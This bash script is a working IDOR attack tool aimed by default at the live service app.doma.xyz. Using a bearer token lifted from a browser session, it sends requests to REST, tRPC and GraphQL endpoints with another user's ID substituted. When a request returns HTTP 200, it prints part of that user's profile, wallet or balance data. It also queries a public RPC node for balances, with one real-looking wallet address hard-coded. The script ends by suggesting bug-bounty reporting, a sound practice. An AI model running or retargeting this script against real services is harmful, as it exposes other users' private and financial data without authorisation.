#!/usr/bin/env bash
# IDOR Testing Framework for Authenticated Web3 Dapps
# Usage: ./idor-test.sh <AUTH_TOKEN> [TARGET_USER_ID]
#
# This script tests for IDOR (Insecure Direct Object Reference) vulnerabilities
# by attempting to access other users' data via API endpoints.
#
# First, obtain auth token from a logged-in session:
# 1. Login to app.doma.xyz (or target)
# 2. Open DevTools -> Network -> Find request to /api/trpc or /api/v1/*
# 3. Copy the Authorization header or cookie

set -euo pipefail

AUTH_TOKEN="${1:-}"
TARGET_USER="${2:-}"

if [[ -z "$AUTH_TOKEN" ]]; then
    echo "Usage: $0 <AUTH_TOKEN> [TARGET_USER_ID]"
    echo ""
    echo "Get AUTH_TOKEN from logged-in session:"
    echo "  1. Login to target app"
    echo "  2. DevTools -> Network -> Any API request"
    echo "  3. Copy Authorization: Bearer <token> header or cookie"
    exit 1
fi

BASE="${TARGET_BASE:-https://app.doma.xyz}"
HEADERS=(-H "Authorization: Bearer $AUTH_TOKEN" -H "Content-Type: application/json")

echo "=== IDOR Testing Framework ==="
echo "Target: $BASE"
echo "Auth: ${AUTH_TOKEN:0:20}..."
echo ""

# Test 1: REST API endpoints with user ID parameter
echo "--- Test 1: REST API /api/v1/* with ID params ---"
for ep in "portfolio" "wallet" "user" "profile" "balance" "token" "domain" "analytics"; do
    echo "Testing /api/v1/$ep..."
    
    # Test without ID (own data)
    code=$(curl -s -o /dev/null -w "%{http_code}" "${HEADERS[@]}" "$BASE/api/v1/$ep" --max-time 10)
    echo "  Own data: HTTP $code"
    
    # Test with target user ID if provided
    if [[ -n "$TARGET_USER" ]]; then
        for param in "userId" "id" "address" "accountId" "walletId"; do
            code=$(curl -s -o /dev/null -w "%{http_code}" "${HEADERS[@]}" "$BASE/api/v1/$ep?$param=$TARGET_USER" --max-time 10)
            if [[ "$code" == "200" ]]; then
                echo "  🔴 IDOR FOUND: /api/v1/$ep?$param=$TARGET_USER -> HTTP 200"
                curl -s "${HEADERS[@]}" "$BASE/api/v1/$ep?$param=$TARGET_USER" | head -c 500
                echo
            elif [[ "$code" == "403" || "$code" == "404" ]]; then
                echo "  Protected: /api/v1/$ep?$param=$TARGET_USER -> HTTP $code"
            fi
        done
    fi
done

echo ""
echo "--- Test 2: tRPC endpoints ---"
# Common tRPC procedures that might accept user IDs
for proc in "portfolio.get" "portfolio.getPortfolio" "wallet.get" "wallet.getBalance" "wallet.getWallets" "user.get" "user.getProfile" "user.getAccount" "domain.get" "domain.getDomains" "token.get" "token.getToken" "analytics.get"; do
    echo "Testing /api/trpc/$proc..."
    
    # Test without params
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${HEADERS[@]}" "$BASE/api/trpc/$proc" -d '{"json":{}}' --max-time 10)
    echo "  Own data: HTTP $code"
    
    # Test with target user ID
    if [[ -n "$TARGET_USER" ]]; then
        for param in "userId" "id" "address" "accountId" "walletId"; do
            payload="{\"json\":{\"$param\":\"$TARGET_USER\"}}"
            code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${HEADERS[@]}" "$BASE/api/trpc/$proc" -d "$payload" --max-time 10)
            if [[ "$code" == "200" ]]; then
                echo "  🔴 IDOR FOUND: /api/trpc/$proc with $param=$TARGET_USER -> HTTP 200"
                curl -s -X POST "${HEADERS[@]}" "$BASE/api/trpc/$proc" -d "$payload" | head -c 500
                echo
            elif [[ "$code" == "403" || "$code" == "404" ]]; then
                echo "  Protected: /api/trpc/$proc with $param=$TARGET_USER -> HTTP $code"
            fi
        done
    fi
done

echo ""
echo "--- Test 3: GraphQL endpoint ---"
# GraphQL introspection for user data queries
if [[ -n "$TARGET_USER" ]]; then
    queries=(
        '{"query":"query { user(id: \"'$TARGET_USER'\") { id email wallets { address balance } portfolio { domains tokens } } }"}'
        '{"query":"query { portfolio(userId: \"'$TARGET_USER'\") { domains { id name } tokens { symbol balance } } }"}'
        '{"query":"query { wallet(address: \"'$TARGET_USER'\") { address balance tokens { symbol amount } } }"}'
        '{"query":"query { domains(owner: \"'$TARGET_USER'\") { id name tld } }"}'
    )
    
    for query in "${queries[@]}"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${HEADERS[@]}" "$BASE/api/graphql" -d "$query" --max-time 10)
        if [[ "$code" == "200" ]]; then
            echo "  🔴 IDOR FOUND: GraphQL query -> HTTP 200"
            curl -s -X POST "${HEADERS[@]}" "$BASE/api/graphql" -d "$query" | head -c 500
            echo
        else
            echo "  GraphQL: HTTP $code"
        fi
    done
fi

echo ""
echo "--- Test 4: RPC endpoint (public, no auth needed) ---"
# Test if RPC can be abused for address enumeration
echo "Testing eth_getBalance for multiple addresses..."
for addr in "0x847D2e62E5AB22EE8F25D46700f22563c23FbDcC" "0x0000000000000000000000000000000000000001" "0x0000000000000000000000000000000000000002"; do
    result=$(curl -s -X POST https://rpc.doma.xyz -H "Content-Type: application/json" -d "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBalance\",\"params\":[\"$addr\",\"latest\"],\"id\":1}" --max-time 5)
    balance=$(echo "$result" | jq -r '.result // "error"')
    echo "  $addr: $balance"
done

echo ""
echo "=== IDOR Testing Complete ==="
echo ""
echo "Next steps if IDOR found:"
echo "1. Document the vulnerable endpoint and parameter"
echo "2. Prove impact (access to PII, financial data, private keys, etc.)"
echo "3. Report to security@target.com or via their bug bounty program"